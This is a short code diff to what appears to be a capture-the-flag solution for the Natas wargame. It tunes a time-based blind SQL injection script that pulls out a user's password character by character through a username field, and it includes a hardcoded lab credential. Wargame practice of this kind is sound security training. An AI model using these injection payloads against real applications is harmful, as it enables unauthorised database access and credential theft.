@@ -15,10 +15,10 @@ for i in range(1,70):
             17,
             "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw",
             endpoint="index.php?debug=yes",
-            data={"username": f'natas18" AND BINARY password LIKE "{w}{chr(65+n)}%" AND SLEEP(2) #'}
+            data={"username": f'natas18" AND BINARY password LIKE "{w}{chr(65+n)}%" AND SLEEP(3) #'}
         )
         end = time()
-        if end - start > 1.5:
+        if end - start > 2.5:
             print(f'{w}{chr(65+n)}')
             w += chr(65+n)
             break
@@ -28,10 +28,10 @@ for i in range(1,70):
             17,
             "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw",
             endpoint="index.php?debug=yes",
-            data={"username": f'natas18" AND BINARY password LIKE "{w}{chr(97 + n)}%" AND SLEEP(2) #'}
+            data={"username": f'natas18" AND BINARY password LIKE "{w}{chr(97 + n)}%" AND SLEEP(3) #'}
         )
         end = time()
-        if end - start > 1.5:
+        if end - start > 2.5:
             print(f'{w}{chr(97+n)}')
             w += chr(97 + n)
             break
@@ -42,10 +42,10 @@ for i in range(1,70):
                 17,
                 "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw",
                 endpoint="index.php?debug=yes",
-                data={"username": f'natas18" AND BINARY password LIKE "{w}{m}%" AND SLEEP(2) #'}
+                data={"username": f'natas18" AND BINARY password LIKE "{w}{m}%" AND SLEEP(3) #'}
             )
             end = time()
-            if end - start > 1.5:
+            if end - start > 2.5:
                 print(f'{w}{m}')
                 w += f'{m}'
                 break
